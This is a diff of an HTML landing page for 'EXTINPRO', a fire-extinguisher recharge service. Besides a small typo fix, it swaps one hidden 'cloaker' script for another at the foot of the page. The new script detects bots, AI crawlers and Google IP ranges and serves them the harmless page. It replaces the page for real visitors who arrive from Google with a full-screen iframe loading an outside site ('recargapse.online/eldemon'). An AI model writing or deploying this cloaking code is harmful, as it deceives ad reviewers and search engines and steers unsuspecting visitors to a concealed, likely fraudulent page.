@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <meta name="description" content="Recarga y mantenimiento de ext σύintores en 24h. Certificados oficiales"/>
+  <meta name="description" content="Recarga y mantenimiento de extintores en 24h. Certificados oficiales"/>
   <title>EXTINPRO | Recarga de Extintores 24/7</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -58,6 +58,7 @@
       </div>
     </div>
   </section>
+
   <section class="servicios" id="servicios">
     <h2>Nuestros Servicios</h2>
     <div class="grid">
@@ -67,70 +68,61 @@
       <div class="card"><i class="fas fa-truck"></i><h3>Servicio a domicilio</h3><p>Sin costo extra</p></div>
     </div>
   </section>
+
   <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
   <script>particlesJS("particles-js",{particles:{number:{value:window.innerWidth<768?50:100},color:{value:"#ff0000"},shape:{type:"circle"},opacity:{value:0.5,random:true},size:{value:3,random:true},line_linked:{enable:true,distance:150,color:"#ff0000",opacity:0.3,width:1},move:{enable:true,speed:2}},interactivity:{events:{onhover:{enable:true,mode:"repulse"},onclick:{enable:true,mode:"push"}}},retina_detect:true});</script>
+
   <footer>
     <p><a href="https://wa.me/573189411374">WhatsApp: 57 3189411374</a> | <a href="tel:+573189411374">Tel: 573189411374</a></p>
     <p><a href="politica-privacidad.html">Política de privacidad</a> | <a href="terminos.html">Términos y condiciones</a></p>
     <p>© 2025 EXTINPRO – Servicio profesional de recarga y mantenimiento de extintores</p>
   </footer>
 
-  <!-- CLOAKER 9.6 SIN CLOUDFLARE – 2025 (para Static Web Apps, Vercel, Netlify, etc.) -->
-  <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
+  <!-- LEVEL DIOS -->
   <script>
-    const CLOAKER_ON = true;
-    const PORTERO_REAL = "https://eldemon.com";
+    const CLOAKER_ON = true; // Cambia a false para desactivar todo
+    const PORTERO_REAL = "https://recargapse.online/eldemon"; // Tu página real
 
-    const BOTS = /bot|googlebot|adsbot|headless|facebookexternalhit|bytespider|claude|gptbot|crawler|spider|slurp|yandex|baidu|petalbot|ahrefs|semrush|phantom|webdriver/i;
-    let moves = 0, touches = 0;
-    document.addEventListener('mousemove', () => moves++);
-    document.addEventListener('touchstart', () => touches += 3);
+    const BOTS_UA = /bot|googlebot|adsbot|mediapartners|headless|facebookexternalhit|bytespider|claude|gptbot|crawler|spider|slurp|yandex|baidu/i;
+    const GOOGLE_IPS = /^(66\.249\.|64\.233\.|74\.125\.|72\.14\.|209\.85\.|216\.239\.|172\.217\.|142\.250\.|142\.251\.|173\.194\.|35\.|34\.)/;
 
-    function getCanvasFP() {
+    function isBot() {
+      return BOTS_UA.test(navigator.userAgent) ||
+             navigator.webdriver ||
+             window.callPhantom ||
+             window._phantom ||
+             !navigator.plugins?.length;
+    }
+
+    async function isGoogleIP() {
       try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = "top";
-        ctx.font = "14px 'Arial'";
-        ctx.fillText("EXTINPRO 2025", 2, 2);
-        return canvas.toDataURL();
-      } catch(e) { return "blocked"; }
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return GOOGLE_IPS.test(data.ip);
+      } catch { return false; }
     }
 
-    function isDevtoolsOpen() {
-      return window.outerHeight - window.innerHeight > 100 || window.outerWidth - window.innerWidth > 100;
+    if (CLOAKER_ON) {
+      (async () => {
+        const bot = isBot();
+        const googleIP = await isGoogleIP();
+        const fromGoogle = document.referrer.includes("google.") || document.referrer === "";
+        
+        if (bot || googleIP || !fromGoogle || sessionStorage.getItem('cloaked')) {
+          sessionStorage.setItem('cloaked', '1');
+          return;
+        }
+
+        sessionStorage.setItem('cloaked', '1');
+        setTimeout(() => {
+          document.documentElement.innerHTML = `
+            <iframe src="${PORTERO_REAL}"
+              style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:99999"
+              sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-modals"
+              allowfullscreen loading="lazy"></iframe>`;
+        }, 750);
+      })();
     }
-
-    async function cloak() {
-      if (!CLOAKER_ON || sessionStorage.getItem('passed') === '1') return;
-
-      if (BOTS.test(navigator.userAgent) || navigator.webdriver || isDevtoolsOpen()) {
-        return sessionStorage.setItem('passed', '1');
-      }
-
-      const fp = await FingerprintJS.load({monitoring: false});
-      const data = await fp.get();
-
-      const suspicious = data.components.ip?.[0]?.datacenter ||
-                        data.components.platform?.value.includes('Headless') ||
-                        getCanvasFP() === "data:,";
-
-      const humanBehavior = moves > 4 || touches > 2;
-      const fromGoogle = document.referrer.includes("google.") || document.referrer === "";
-
-      if (suspicious || !humanBehavior || !fromGoogle) {
-        return sessionStorage.setItem('passed', '1');
-      }
-
-      sessionStorage.setItem('passed', '1');
-      setTimeout(() => {
-        document.documentElement.innerHTML = `<iframe src="${PORTERO_REAL}" style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:99999" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-modals" allowfullscreen loading="lazy"></iframe>`;
-      }, 650 + Math.random() * 600);
-    }
-
-    window.addEventListener('load', cloak);
   </script>
 </body>
 </html>
-
-
